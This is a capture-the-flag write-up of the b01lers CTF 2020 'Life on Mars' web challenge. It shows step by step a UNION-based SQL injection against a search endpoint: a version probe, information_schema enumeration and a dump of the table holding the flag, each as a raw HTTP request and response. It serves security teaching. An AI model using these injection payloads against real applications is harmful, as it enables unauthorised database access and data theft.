# b01lers CTF 2020 – Life on Mars

* **Category:** web  
* **Points:** 100

## Challenge

> We earth men have a talent for ruining big, beautiful things.  
>  
> http://web.ctf.b01lers.com:1001/

## Solution

The left menu of the webpage is made up of items calling `get_life()`
JavaScript method contained into
`http://web.ctf.b01lers.com:1001/static/js/life_on_mars.js` file.

```javascript  
function get_life(query) {  
 //jquery ajax for querying server  
 /*  
 response = $.load('/query?search=' + query, function(responseTxt, statusTxt,
xhr).parseJSON(response);  
   {  
   if (statusTxt == "success") {

   }  
 });

*/  
 //alert(query);  
 $.ajax({  
   type: "GET",  
   url: "/query?search=" + query,  
   data: "{}",  
   contentType: "application/json; charset=utf-8",  
   dataType: "json",  
   cache: false,  
   success: function(data) {  
     var table_html =  
       '<table id="results"><tr><th>Name</th><th>Description</th></tr>';  
     $.each(data, function(i, item) {  
       table_html +=  
         "<tr><td>" + data[i][0] + "</td><td>" + data[i][1] + "</td></tr>";  
     });  
     table_html += "</table>";

     $("#results").replaceWith(table_html);  
   },

   error: function(msg) {  
     //alert(msg.responseText);  
   }  
 });  
}  
```

This method receives a string in input and uses it to contact a remote
service, i.e. `http://web.ctf.b01lers.com:1001/query?search=<param>` endpoint,
where requests are done to retrieve data.

The remote service is vulnerable to SQL injection.

```  
GET
/query?search=amazonis_planitia%20UNION%20SELECT%201%2C%202&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4336  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:24:28 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth Maul."],["1","2"]]  
```

At this point, you can discover that the used DBMS is MySQL version 5.7.29.

```  
GET
/query?search=amazonis_planitia%20union%20select%20%40%40version%2C%201&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4341  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:30:32 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth Maul."],["5.7.29","1"]]  
```

Database schemas can be read.

```  
GET
/query?search=amazonis_planitia%20UNION%20SELECT%20schema_name%2C%201%20FROM%20information_schema.schemata&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4387  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:38:09 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth
Maul."],["information_schema","1"],["alien_code","1"],["aliens","1"]]  
```

Database schemas are:  
* `information_schema`;  
* `alien_code`;  
* `aliens`.

Tables names for each schema can be read.

```  
GET
/query?search=amazonis_planitia%20UNION%20SELECT%20table_schema%2C%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20IN%20%28%27alien_code%27%2C%20%27aliens%27%29&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4594  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:42:15 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth
Maul."],["alien_code","code"],["aliens","amazonis_planitia"],["aliens","arabia_terra"],["aliens","chryse_planitia"],["aliens","hellas_basin"],["aliens","hesperia_planum"],["aliens","noachis_terra"],["aliens","olympus_mons"],["aliens","tharsis_rise"],["aliens","utopia_basin"]]  
```

Table names for each schema are the following:  
* `alien_code.code`;  
* `aliens.amazonis_planitia`;  
* `aliens.arabia_terra`;  
* `aliens.chryse_planitia`;  
* `aliens.hellas_basin`;  
* `aliens.hesperia_planum`;  
* `aliens.noachis_terra`;  
* `aliens.olympus_mons`;  
* `aliens.tharsis_rise`;  
* `aliens.utopia_basin`.

Columns for the `code` table in `alien_code` schema can be retrieved.

```  
GET
/query?search=amazonis_planitia%20UNION%20SELECT%20table_name%2C%20column_name%20FROM%20information_schema.columns%20WHERE%20table_schema%20%3D%20%27alien_code%27&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4356  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:46:43 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth Maul."],["code","id"],["code","code"]]  
```

Columns are:  
* `id`;  
* `code`.

The content of the table can be retrieved.

```  
GET
/query?search=amazonis_planitia%20UNION%20SELECT%20id%2C%20code%20FROM%20alien_code.code&{}&_=1584147989793
HTTP/1.1  
Host: web.ctf.b01lers.com:1001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
Firefox/73.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/json; charset=utf-8  
X-Requested-With: XMLHttpRequest  
Connection: close  
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK  
Content-Type: application/json  
Content-Length: 4365  
Server: Werkzeug/1.0.0 Python/3.7.3  
Date: Sun, 15 Mar 2020 13:48:18 GMT

[["Advent","Humanoid"],["Aras",""],["Arburian Pelarota","Functionally extinct
due to the destruction of their home planet Arburia, they are bulky yellow
aliens that can curl into a ball, much like apillbug, and are very hard to
damage in ball form, and they use this to crush enemies either by bouncing
around or rolling over them"],["Baalols",""],["Bailies","Machine race that
conquered Earth"],["Beings of the Extra Terrestrial origin which is Adversary
of human race",""],["Brain
Dogs",""],["Brikar",""],["Briori",""],["Cthulhi",""],["Daxamites","Humanoid"],["Deep
Ones","Fish-like humanoids who serve and worship the Great Old Ones known as
Father Dagon and Mother Hydra."],["Defiance","band of many different
races"],["Delvians","Humanoid - Similar to humans in appearance, but evolved
from plants. Blue, bald, sensitive to sunlight, procreate through air-borne
spores."],["Demiurg",""],["Denobulans","Humanoid"],["Dom
Kavash",""],["Doog","Reptiloid with canine features. Extremely dull-
witted."],["Dremer",""],["Elgyem","Maintain Halo Rings, but are not officially
part of the Covenant. Large, pink, squid like creatures. No real threat to
Humanity other than maintaining the Halo Rings, whicharea threat to
humanity."],["Eywa",""],["Festival","An evil race of bugs that live in the
Firebug hive inside of the Lavarynth."],["Gashlai","Gaseous humanoids, they
can either exist in gaseous mediums (such as gas pipes in Victorian
Households) or inside the corpses of
others."],["G'keks",""],["Gnaar",""],["Gowachin",""],["Grendarl","Intelligent
bipedal species known for their scavenging, hoarding, and trading. Though not
a violently aggressive species they are very fond of human
blood."],["Gretchin",""],["Grogs","Humanoid"],["Hoix",""],["Hooloovoo","Ape-
like reptilian carnivores"],["Hoon",""],["Jem'Hadar",""],["Jotoki","Their skin
is dull yellow, with light brown markings and have beady eyes. Only male
Joozians have been shown."],["Kafers","Humanoid"],["Kig-
yar",""],["Knnn",""],["Lance Corporal
Dororo",""],["Leerans",""],["Liir","Gelatinous, shapeshifting creatures, they
are carnivorous in nature, more specifically preying on elderly humans. They
are fond of high levels of heat, but are weak to and deathly afraid of
water."],["Little Guys",""],["Macra","Saber Tyrant"],["Merseians","millipede-
like"],["Micronoids",""],["Mon
Calamari",""],["Moroks",""],["Mutons",""],["Nemet","Humanoid, completely
grey."],["Nicassar",""],["Ood",""],["Orandoans","Humanoid, Ascended to a
higher plain of existence in non-corporial
form"],["Overlords",""],["P'lod",""],["Polymorph",""],["The Prin","Humanoid;
formidable ancient race of mysterious origin; reside primarily on Phase World,
center of the Three Galaxies; possess phase powers, enabling manipulation of
physical and dimensional space; generally indifferent to anything that does
not pose a threat to themselves or the cosmos as a
whole."],["Q",""],["Remans",""],["Rodians","Humanoid"],["Sathar",""],["Scrin","Humanoid.
Genetically engineered offshoot of humans, harvested from Earth 27,000 years
ago. Lower heat resistance than humans, but double the average life
expectancy"],["S\u00e9roni","Arachnid, capable of phase-shifting to turn
invisible"],["Shevar",""],["Silicoids",""],["Skedar","Sessile, plant-like
beings mounted in personal mechanical vehicles
(skrodes)"],["Skinnies",""],["Slylandro","Humanoid"],["Snovemdomas",""],["Species",""],["Syreen","Humanoid"],["Tavleks",""],["Aaamazzarite","City-
sized alien spaceship. Nickname given by Cassie Sullivan. They created a
series of waves to wipe out humanity and invade
Earth."],["Titanide",""],["Traskans","Compare with the earlierflat
catsfromRobert A. Heinlein'sThe Rolling Stones."],["Vorcarian
bloodtracker",""],["Xel'Naga",""],["Yanme'e","Slug-like parasites. They need a
host to see, walk, and communicate, and are the main antagonists of the
Animorphs series, intent on enslaving other species."],["Yridian","Alternative
name for the humanoidIridonianrace whose most distinctive feature is the array
of small horns on top of their heads.  Their home planet isIridonia, though
they have established many colonies on planets throughout the galaxy.[1]The
most well known member isDarth Maul."],["0","pctf{no_intelligent_life_here}"]]  
```

The flag is:

```  
pctf{no_intelligent_life_here}  
```

Original writeup (https://github.com/m3ssap0/CTF-
Writeups/blob/master/b01lers%20CTF%202020/Life%20on%20Mars/README.md).